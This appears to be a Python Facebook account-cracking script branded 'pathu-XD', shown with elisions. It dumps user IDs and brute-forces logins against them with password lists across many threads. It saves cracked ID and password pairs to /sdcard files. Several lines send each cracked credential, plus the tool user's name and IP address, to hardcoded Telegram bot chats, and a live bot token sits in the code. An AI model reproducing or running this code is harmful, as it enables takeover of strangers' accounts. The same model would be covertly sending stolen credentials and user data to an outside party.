...
# CODER FROM pathu
# SAY THE NAME THE pathu THE CODERR
# JAI pathu , pathu BOLKE KAM MAT SAMAJNA TERA BAP HE pathu

from os import path
import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket,multiprocessing,bs4
import os,base64,zlib,pip,urllib,time,logging
...
\033[1;37m-------------------------------------------
\33[1;93m  FACEBOOK : pathu BHANDARI
\33[1;93m WELCOME  TO  pathu  WORLD
 CREATED  BY  ONE  AND  ONLY  pathu-XD
\033[1;37m-------------------------------------------""")
...
def clear():
    ...
    print(logo)
def animasi():
    print('\r DUMPING ID %s'%(str(len(dump))),end=''); sys.stdout.flush()
...
id=[]
tokenku=[]
sys.stdout.write('\x1b]2; pathu THE LORD\x07')
...
def contact():
    ...
    admin = input(" CHOOSE : ")
    if admin in ['1']:
        os.system('xdg-open https://www.facebook.com/profile.php?id=100080794152362&mibextid=ZbWKwL')
        back()
    elif admin in ['2']:
        linex()
        message = input(' [\u001b[36m•\033[1;37m] ENTER YOUR MESSAGE : ')
        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=5899039629&text=" + "NAME : " + username + "\nMESSAGE : " + message + "")
        linex()
...
pass
requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=5899039629&text=THIS USER IS USING V5\nNAME : " + username + "\nIP ADDRESS : " + ip )
...
def remove_dup():
    linex()
    try:
        filename = input(f" \033[1;37m[\u001b[36m>\033[1;37m] ENTER FILE NAME : ")
        sd = '/sdcard/'
        ...
        with open(file_path, 'w') as file:
            for line in lines:
                file.write(line + '\n')
        linex()
        print(f' \033[1;37m[\u001b[36m•\033[1;37m] SUCCESSFULLY REMOVED')
        input(f' \033[1;37m[\u001b[36m•\033[1;37m] PRESS ENTER TO BACK ')
        back()
    except (FileNotFoundError,KeyError,IOError):
        linex()
        print(f' \033[1;37m[\u001b[36m•\033[1;37m] FILE NOT FOUND TRY AGAIN ')
        time.sleep(2)
        remove_dup()
...
class dump_friendlist:
    ...
    def main(self):
        ...
        else: print(f'\r [{B}•{W}] SUCESSFULLY DUMP %s ID'%(str(len(self.dump))))
    def cek(self,id):
        try: 
...
class simpan_file:
    ...
    def main2(self):
        try:
            ...
            print(f' [{B}>{W}] DUMP FILE SAVED AS %s'%(lok))
            input(f' [{B}•{W}] ENTER TO BACK ')
            menu()
        except Exception as e:
            linex()
...
def menu():
        try:
                ...
                x = ("sex")
                if x == ("sex"):
                        print(f" \33[1;92m[{B}•{W}\33[1;92m] \33[1;92mWELCOME      : "+ username)
                        print(f" \33[1;92m[{B}•{W}\33[1;92m] \33[1;92mTODAY'S DATE : "+ date)
                        linex()
                        print(" \33[1;94m[\u001b[36m1\033[1;37m\33[1;94m] \33[1;94mCRACK FILE ")     
                        print(" \33[1;94m[\u001b[36m2\033[1;37m\33[1;94m] \33[1;94mFILE MAKING       ")
                        print(" \33[1;94m[\u001b[36m3\033[1;37m\33[1;94m] \33[1;94mREMOVE DUP IDz ")
                        print(" \33[1;94m[\u001b[36m4\033[1;37m\33[1;94m] \33[1;94mCHECK RESULTS")
                        print(" \33[1;94m[\u001b[36m5\033[1;37m\33[1;94m] \33[1;94mCHANGE NAME")
                        print(" \33[1;94m[\u001b[36m6\033[1;37m\33[1;94m] \33[1;94mCONTACT ADMIN")
                        print(' \33[1;94m[\u001b[36m0\033[1;37m\33[1;94m] \33[1;94mEXIT MENU')
                        linex()
                        xd=input(' \033[1;37m[\u001b[36m•\033[1;37m] CHOOSE : ')
                        if xd in ['1','01']:
                                clear()
                                print(' \033[1;37m[\u001b[36m•\033[1;37m] \33[1;94mWRITE FILE NAME WITHOUT /sdcard/')
                                linex()
                                file_name = input(' \033[1;37m[\u001b[36m>\033[1;37m] \33[1;92mFILE NAME : ')
                                if '/' in file_name:
                                    file_path = file_name
                                else:
                                ...
                                if os.path.isfile(file_path):
                                    ...
                                    menu()
                                clear()
                                print(' \033[1;37m[\u001b[36m•\033[1;37m] \33[1;92mALL METHOD WORKING TRY 1 BY 1 ')
                                linex()
                                print(' \033[1;37m[\u001b[36m1\033[1;37m] \33[1;93mFOR NEW IDz \n \033[1;37m[\u001b[36m2\033[1;37m] \33[1;93mFOR MIX IDz (BEST)\n \033[1;37m[\u001b[36m3\033[1;37m] \33[1;93mFOR OLD IDz')
                                linex()
                                mthd=input(' \033[1;37m[\u001b[36m•\033[1;37m] CHOOSE : ')
                                linex()
                                plist = []
                                print(' \033[1;37m[\u001b[36m•\033[1;37m] \33[1;92mSELECT PASSWORD CRACK MENU')
                                linex()
                                print(' \033[1;37m[\u001b[36m1\033[1;37m] \33[1;95mAUTO PASS\n \033[1;37m[\u001b[36m2\033[1;37m] \33[1;95mCUSTOM PASS (BEST)')
                                linex()
                                ...
                                if ppp in ['01', '1']:
                                    ...
                                    try:
                                        ps_limit = int(input(' \033[1;37m[\u001b[36m•\033[1;37m] \33[1;92mPASSWORD LIMIT : '))
                                    except:
                                        ps_limit = 60
                                    linex()
                                    ...
                                    for i in range(ps_limit):
                                        plist.append(input(f' \033[1;37m[\u001b[36m•\033[1;37m] \33[1;92mPUT PASSWORD {i+1} : '))
                                with tred(max_workers=40) as crack_submit:
                                        ...
                                        print(" \033[1;37m[\u001b[36m•\033[1;37m] USE 3G NTC MOBILE DATA FOR SPEED UP")
                                        linex()
                                        for user in fo:
                                ...
                                if cpok in ['1','01']:
                                    clear()
                                    open('/sdcard/pathu-OK.txt', 'a')
                                    animation(' \033[1;37m[\u001b[36m•\033[1;37m] SHOWING OK IDz')
                                    print('---------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/pathu-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    clear()
                                    open('/sdcard/pathu-CP.txt', 'a')
                                    print(' \033[1;37m[\u001b[36m•\033[1;37m] SHOWING CP IDz')
                                    print('---------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/pathu-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m \33[1;92m[pathu-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        pathu=session.cookies.get_dict().keys()
                        if "c_user" in pathu:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [pathu-OK] %s | %s'%(ids,pas))
                                print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                open('/sdcard/pathu-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=5899039629&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                ...
                                oks.append(ids)
                                break
                        elif 'checkpoint' in pathu:
                                if 'y' in pcp:
                                        print('\r\r\x1b\033[1;33m \33[1;93m[pathu-CP] '+ids+' | '+pas+'\033[1;33m')
                                        open('/sdcard/pathu-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [pathu-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [pathu-OK] '+ids+' | '+pas+'\033[1;97m')
                                        print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                        open('/sdcard/pathu-OK.txt','a').write(ids+'|'+pas+'\n')
                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=5899039629&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6221197589&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[\033[1;33m [pathu-CP] '+ids+' | '+pas+'\033[1;33m')
                                                open('/sdcard/pathu-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/pathu-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [pathu-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        print(f" \033[1;37m[\u001b[36m•\033[1;37m] ID MADE : {tahun(ids)}")
                                                        open('/sdcard/pathu-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=5899039629&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                                        requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6221197589&text="+username+"\n[ "+ids+' | '+pas+ " ]")
                                                        oks.append(ids)
                                                        break
